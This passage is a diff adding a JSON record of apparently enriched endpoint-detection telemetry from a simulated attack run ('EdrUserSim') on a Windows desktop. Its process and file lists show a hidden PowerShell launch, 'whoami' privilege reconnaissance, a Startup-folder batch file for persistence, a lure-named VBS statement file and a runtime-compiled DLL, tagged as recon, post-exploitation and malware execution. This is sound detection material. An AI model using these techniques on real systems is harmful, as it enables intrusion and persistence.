+                  "cmdline": "\\\"powershell.exe\\\" -NoProfile -NonInteractive -WindowStyle Hidden -Command \\\"Get-Date | Out-File -FilePath 'C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\hidden-ok.txt' -Encoding utf8\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:56:09.252000Z",
+                  "parent_ref": "P022"
+                },
+                {
+                  "ref": "P024",
+                  "image": "C:\\\\Windows\\\\System32\\\\taskkill.exe",
+                  "cmdline": "\\\"taskkill.exe\\\" /PID 6108 /T /F",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:56:44.235585Z",
+                  "parent_ref": "P022"
+                },
+                {
+                  "ref": "P025",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "\\\"cmd.exe\\\" /c \\\"(whoami /groups &amp; whoami /priv) &gt; \\\"\\\"C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\out-27f68978b33941338340c2d0986e0cb3.txt\\\"\\\" 2&gt;&amp;1\\\"",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:56:48.432636Z",
+                  "parent_ref": "P022"
+                },
+                {
+                  "ref": "P026",
+                  "image": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe",
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "observed_at": "2026-09-15T00:59:13.429000Z"
+                }
+              ],
+              "file_operations": [
+                {
+                  "path": "C:\\\\Windows\\\\Temp\\\\__PSScriptPolicyTest_h1kgbglu.ocb.ps1",
+                  "operation": "OTHER",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-14T20:15:51.631000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\Desktop\\\\Run-EdrUserSim.cmd",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P002",
+                  "observed_at": "2026-09-14T23:53:55.918000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Microsoft\\\\CLR_v4.0\\\\UsageLogs\\\\powershell.exe.log",
+                  "operation": "OTHER",
+                  "process_ref": "P003",
+                  "observed_at": "2026-09-14T23:54:47.641000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\EdrUserSim-Backup.bat",
+                  "operation": "OTHER",
+                  "process_ref": "P003",
+                  "count": 3,
+                  "time_range": [
+                    "2026-09-14T23:55:03.339000Z",
+                    "2026-09-15T00:56:20.026000Z"
+                  ]
+                },
+                {
+                  "path": "C:\\\\Users\\\\WISH-W~1\\\\AppData\\\\Local\\\\Temp\\\\Temp1_edr.zip\\\\Run-EdrUserSim.cmd",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P002",
+                  "observed_at": "2026-09-15T00:05:30.690000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_3zeub5md.lws.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P003",
+                  "observed_at": "2026-09-15T00:05:38.420000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\本月对账单.vbs",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P003",
+                  "count": 3,
+                  "time_range": [
+                    "2026-09-15T00:05:55.125000Z",
+                    "2026-09-15T00:55:39.746000Z"
+                  ]
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_v4seugv2.fyz.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P012",
+                  "observed_at": "2026-09-15T00:06:24.900000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\Downloads\\\\EdrUserSim-Tool.bat",
+                  "operation": "OTHER",
+                  "process_ref": "P003",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-15T00:06:42.899000Z",
+                    "2026-09-15T00:56:27.166000Z"
+                  ]
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_qecze1wv.neu.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P015",
+                  "observed_at": "2026-09-15T00:45:27.626000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_ao5almt1.0vu.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P018",
+                  "observed_at": "2026-09-15T00:46:09.532000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_hoh1kpeh.03y.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P019",
+                  "observed_at": "2026-09-15T00:46:12.079000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_vnftdfag.d32.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-15T00:46:14.571000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\Desktop\\\\Invoke-EdrUserSim.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P002",
+                  "observed_at": "2026-09-15T00:55:20.552000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_fkmkba1p.o3g.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P022",
+                  "observed_at": "2026-09-15T00:55:22.975000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_tkaawmpf.ovy.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-15T00:56:04.437000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_imhpkkhs.jjd.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-15T00:56:06.890000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\invoice-cscript.vbs",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P022",
+                  "observed_at": "2026-09-15T00:58:03.413000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_kcah5hww.q0y.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-15T00:58:19.096000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_mtrzof4s.fes.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-15T00:58:21.543000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\EdrUserSim\\\\scan.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P022",
+                  "observed_at": "2026-09-15T00:58:45.323000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_hscjqwoc.jqg.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-15T00:58:45.417000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_mobn1bjw.4yv.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P022",
+                  "observed_at": "2026-09-15T00:58:59.678000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\qffrfoen.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P022",
+                  "observed_at": "2026-09-15T00:59:12.741000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\qffrfoen.dll",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P026",
+                  "observed_at": "2026-09-15T00:59:13.429000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\EdrUserSim\\\\tool.ps1",
+                  "operation": "OTHER",
+                  "process_ref": "P022",
+                  "observed_at": "2026-09-15T00:59:15.705000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_4qg3p5sq.vy2.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-15T00:59:15.799000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_cxktst3f.a2r.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                  "observed_at": "2026-09-15T00:59:20.866000Z"
+                },
+                {
+                  "path": "C:\\\\Users\\\\wish-wish10-pc\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_bprav4mf.jxh.ps1",
+                  "operation": "SUSPICIOUS_FILE_OP",
+                  "process_ref": "P022",
+                  "observed_at": "2026-09-15T00:59:23.700000Z"
+                }
+              ],
+              "network_details": [
+                {
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-14T20:15:51.631000Z"
+                },
+                {
+                  "process_ref": "P002",
+                  "count": 3,
+                  "time_range": [
+                    "2026-09-14T23:53:55.918000Z",
+                    "2026-09-15T00:55:20.552000Z"
+                  ]
+                },
+                {
+                  "process_ref": "P004",
+                  "count": 3,
+                  "time_range": [
+                    "2026-09-14T23:54:01.589573Z",
+                    "2026-09-15T00:56:48.432636Z"
+                  ]
+                },
+                {
+                  "process_ref": "P006",
+                  "observed_at": "2026-09-14T23:54:03.804822Z"
+                },
+                {
+                  "process_ref": "P003",
+                  "count": 39,
+                  "time_range": [
+                    "2026-09-14T23:54:47.641000Z",
+                    "2026-09-15T00:59:23.700000Z"
+                  ]
+                },
+                {
+                  "process_ref": "P013",
+                  "count": 3,
+                  "time_range": [
+                    "2026-09-15T00:07:00.040815Z",
+                    "2026-09-15T00:56:44.235585Z"
+                  ]
+                },
+                {
+                  "process_ref": "P017",
+                  "observed_at": "2026-09-15T00:45:32.662959Z"
+                },
+                {
+                  "process_ref": "P026",
+                  "observed_at": "2026-09-15T00:59:13.429000Z"
+                }
+              ],
+              "authentication_activities": [
+                {
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "session_id": "{31815e39-0478-6aa7-963b-050000000000}",
+                  "source_ip": "172.16.2.110",
+                  "event_type": "SUSPICIOUS_RECON_CMD",
+                  "count": 3,
+                  "time_range": [
+                    "2026-09-14T23:54:01.589573Z",
+                    "2026-09-15T00:56:48.432636Z"
+                  ]
+                },
+                {
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "session_id": "{31815e39-0478-6aa7-963b-050000000000}",
+                  "source_ip": "172.16.2.110",
+                  "event_type": "LM_POST_EXPLOIT",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-14T23:54:03.804822Z",
+                    "2026-09-15T00:45:32.662959Z"
+                  ]
+                },
+                {
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "session_id": "{31815e39-0478-6aa7-963b-050000000000}",
+                  "source_ip": "172.16.2.110",
+                  "event_type": "OTHER",
+                  "count": 9,
+                  "time_range": [
+                    "2026-09-14T23:54:49.775000Z",
+                    "2026-09-15T00:56:09.252000Z"
+                  ]
+                },
+                {
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "session_id": "{31815e39-0478-6aa7-963b-050000000000}",
+                  "source_ip": "172.16.2.110",
+                  "event_type": "HIGH_FREQ_PROCESS_SPAWN",
+                  "count": 3,
+                  "time_range": [
+                    "2026-09-15T00:07:00.040815Z",
+                    "2026-09-15T00:56:44.235585Z"
+                  ]
+                },
+                {
+                  "user": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+                  "session_id": "{31815e39-0478-6aa7-963b-050000000000}",
+                  "source_ip": "172.16.2.110",
+                  "event_type": "MALWARE_EXECUTION",
+                  "observed_at": "2026-09-15T00:46:11.993097Z"
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    "asset": {
+      "entities": [
+        {
+          "entity_ref": "E1",
+          "asset_id": "3617504",
+          "hostname": "web PC",
+          "ip": "172.16.2.99",
+          "tags": [
+            "server"
+          ]
+        },
+        {
+          "entity_ref": "E2",
+          "asset_id": "3617506",
+          "hostname": "DESKTOP-U8GL6JB",
+          "ip": "172.16.2.109",
+          "tags": [
+            "server"
+          ]
+        },
+        {
+          "entity_ref": "E3",
+          "asset_id": "3617507",
+          "hostname": "DESKTOP-C82PUMN",
+          "ip": "172.16.2.110"
+        }
+      ]
+    },
+    "threat_intel": {
+      "indicators": [
+        {
+          "indicator_type": "ip",
+          "value": "10.10.10.133",
+          "entity_refs": [
+            "E4"
+          ],
+          "intel_hit": false
+        },
+        {
+          "indicator_type": "ip",
+          "value": "172.16.1.100",
+          "entity_refs": [
+            "E1",
+            "E5"
+          ],
+          "intel_hit": false
+        },
+        {
+          "indicator_type": "ip",
+          "value": "172.16.2.109",
+          "entity_refs": [
+            "E2",
+            "E6",
+            "E7",
+            "E8"
+          ],
+          "intel_hit": false
+        },
+        {
+          "indicator_type": "ip",
+          "value": "172.16.2.110",
+          "entity_refs": [
+            "E10",
+            "E3",
+            "E9"
+          ],
+          "intel_hit": false
+        },
+        {
+          "indicator_type": "ip",
+          "value": "172.16.2.99",
+          "entity_refs": [
+            "E1",
+            "E5"
+          ],
+          "intel_hit": false
+        }
+      ]
+    },
+    "history": {
+      "records": []
+    }
+  },
+  "data_completeness": 0.8,
+  "enrichment_latency_ms": 148401
+}
